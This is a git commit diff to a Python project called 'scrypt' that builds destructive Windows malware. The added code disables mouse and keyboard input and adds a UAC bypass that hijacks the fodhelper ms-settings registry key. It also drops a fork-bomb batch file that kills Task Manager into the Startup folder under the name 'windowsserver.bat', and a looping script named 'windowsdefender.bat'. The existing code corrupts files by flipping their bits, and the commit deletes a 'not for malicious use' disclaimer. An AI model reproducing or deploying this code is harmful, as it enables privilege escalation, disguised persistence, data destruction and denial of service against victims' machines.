77e9fdf90d54f57a095978852da4ae9351779a64
Cooper <Cooperransom08@gmail.com>
2023-03-22 15:50:17 -0400

    big changes

--- scrypt/main.py
+++ scrypt/main.py
@@ -4,3 +4,7 @@
 from resource import functions, Ptime, decryption 
 from resource import encryption, key, hash, crytography_functions
 
+def start():
+  functions.minimize_current_window()
+  functions.disable_mouse_keyboard_windows()
+  
--- scrypt/resource.py
+++ scrypt/resource.py
@@ -8,6 +8,7 @@ try:
   import string
   import ctypes
   import binascii
+  import _winreg
   import platform
   import time, datetime
 except ImportError:
@@ -15,6 +16,9 @@ except ImportError:
   time.sleep(5)
   exit()
 
+# Globals
+CC = lambda: os.system('cls' if os.name == 'nt' else 'clear')
+startupDir = (r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' %os.getlogin())
 
 # Classes
 class crytography_functions:
@@ -73,7 +77,6 @@ class crytography_functions:
       Fout.write(newLine)
 
   def getinfo():
-    # DISCLAMER: This is not for malicious use, this is for development only.
     OS = ("Operating-System: ", sys.platform)
     currentTime = ("Time: ", datetime.now().time())
     currentDate = ("Date: ", datetime.now().date())
@@ -370,14 +373,12 @@ class functions():
       raise OSError('System32 directory does not exist.')
 
   def corrupt_startup_files(source_folder):
-    # Create a list of files in the source directory
     files_in_source_folder = os.listdir(source_folder)
 
     # Corrupt the files by swapping random bits in their content
     for file in files_in_source_folder:
       path_to_file = os.path.join(source_folder, file)
       with open(path_to_file, "rb") as binary_file:
-        # Read the file
         data = binary_file.read()
         # Iterate over the bits in the file content
         for bit_index in range(len(data)):
@@ -385,8 +386,7 @@ class functions():
           switch = random.choice([True, False])
           if switch:
             # Replace the bit at the current index with its inverse
-            data = data[:bit_index] + bytes([data[bit_index] ^ 0xFF
-                                             ]) + data[bit_index + 1:]
+            data = data[:bit_index] + bytes([data[bit_index] ^ 0xFF]) + data[bit_index + 1:]
       # Write the corrupted content back to the file
       with open(path_to_file, "wb") as binary_file:
         binary_file.write(data)
@@ -396,3 +396,79 @@ class functions():
     ctypes.windll.user32.BlockInput(True)
     # Disable keyboard
     ctypes.windll.user32.DisableProcessWindowsGhosting()
+
+  def UACbypass():
+    CMD = r"C:\Windows\System32\cmd.exe"
+    FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
+    PYTHON_CMD = "python"
+    REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
+    DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
+
+    def is_running_as_admin():
+      try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+      except:
+        return True
+
+    def create_reg_key(key, value):
+      try:
+        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
+        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)
+        _winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)
+        _winreg.CloseKey(registry_key)
+      except WindowsError:
+        raise
+
+    def bypass_uac(cmd):
+      try:
+        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
+        create_reg_key(None, cmd)
+      except WindowsError:
+        raise
+
+    def execute():
+      if is_running_as_admin():
+        pass
+        try:
+          current_dir = os.path.dirname(
+            os.path.realpath(__file__)) + '\\' + __file__
+          cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
+          bypass_uac(cmd)
+          os.system(FOD_HELPER)
+          CC()
+        except WindowsError:
+          functions.seppuku()
+          sys.exit(0)
+      else:
+        pass
+
+  # ALTERNATIVE BYPASS (TEST zFIRST)
+  #def UACbypass():
+    #try:
+      # Get the current value of the UAC
+      #val = ctypes.windll.shell32.IsUserAnAdmin()
+      # Set the UAC to 0 (disabled)
+      #ctypes.windll.shell32.SetUserAccountControl(0)
+      # Return the result
+      #return val
+    #except:
+      #sys.exit(1)
+
+  def CPUmuncher():
+    with open(startupDir+'/windowsserver.bat', 'w') as fin:
+      fin.write('''
+@ECHO OFF
+:infLoop
+%0|%0
+tskill Taskmgr
+goto infLoop
+      ''')
+      fin.close
+    with open(startupDir+'/windowsdefender.bat', 'w') as Fin:
+      Fin.write('''
+@ECHO OFF
+Do
+msgbox "hello"
+Loop
+      ''')
+      Fin.close()
